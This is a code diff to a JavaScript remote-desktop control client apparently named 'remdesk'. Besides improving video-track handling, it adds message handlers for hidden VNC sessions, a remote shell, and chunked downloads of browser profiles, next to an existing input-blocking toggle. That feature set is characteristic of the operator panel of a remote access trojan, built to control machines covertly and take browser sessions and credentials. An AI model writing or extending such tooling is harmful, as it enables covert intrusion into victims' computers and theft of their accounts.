@@ -793,8 +793,27 @@
       startSignalingPing(signalingSocket, sessionId);
 
       state.peerConnection.ontrack = (event) => {
-        dom.screenEl.srcObject = event.streams[0];
-        remdesk.updateScreenLayout();
+        console.info("Received track:", {
+          kind: event.track.kind,
+          id: event.track.id,
+          readyState: event.track.readyState,
+          streams: event.streams.length
+        });
+        if (event.track.kind === "video") {
+          if (event.streams && event.streams[0]) {
+            dom.screenEl.srcObject = event.streams[0];
+            console.info("Video stream attached to screen element");
+          } else {
+            // Create a new MediaStream with just this track
+            const stream = new MediaStream([event.track]);
+            dom.screenEl.srcObject = stream;
+            console.info("Created new MediaStream for video track");
+          }
+          remdesk.updateScreenLayout();
+        } else if (event.track.kind === "audio") {
+          // Handle audio track if needed
+          console.info("Audio track received");
+        }
       };
       state.peerConnection.onicecandidate = (event) => {
         if (event.candidate && signalingSocket.readyState === WebSocket.OPEN) {
@@ -930,6 +949,43 @@
       if (parsed.action === "toggle_input_blocking" || parsed.action === "get_input_blocking_status") {
         if (remdesk.handleInputBlockingResponse) {
           remdesk.handleInputBlockingResponse(parsed);
+        }
+        return;
+      }
+      // HVNC: Handle all hvnc_ prefixed actions
+      if (parsed.action && parsed.action.startsWith("hvnc_")) {
+        if (remdesk.hvnc && remdesk.hvnc.handleResponse) {
+          remdesk.hvnc.handleResponse(parsed);
+        }
+        return;
+      }
+      // Remote Shell: Handle all shell_ prefixed actions and shell_output
+      if (parsed.action && (parsed.action.startsWith("shell_") || parsed.action === "shell_output")) {
+        if (remdesk.shell && remdesk.shell.handleResponse) {
+          remdesk.shell.handleResponse(parsed);
+        }
+        return;
+      }
+      // Browser Profiles: Handle all profile_ prefixed actions
+      if (parsed.action && parsed.action.startsWith("profile_")) {
+        if (remdesk.profiles && remdesk.profiles.handleResponse) {
+          remdesk.profiles.handleResponse(parsed);
+        }
+        return;
+      }
+      // Handle chunked download (used for profiles and other large data)
+      if (parsed.action === "download_chunk") {
+        if (parsed.kind === "profile") {
+          if (remdesk.profiles && remdesk.profiles.handleChunk) {
+            remdesk.profiles.handleChunk(parsed);
+          }
+        }
+        return;
+      }
+      // Profile data chunks (legacy)
+      if (parsed.kind === "profile" || (state.pendingDownload && state.pendingDownload.kind === "profile")) {
+        if (remdesk.profiles && remdesk.profiles.handleResponse) {
+          remdesk.profiles.handleResponse(parsed);
         }
         return;
       }
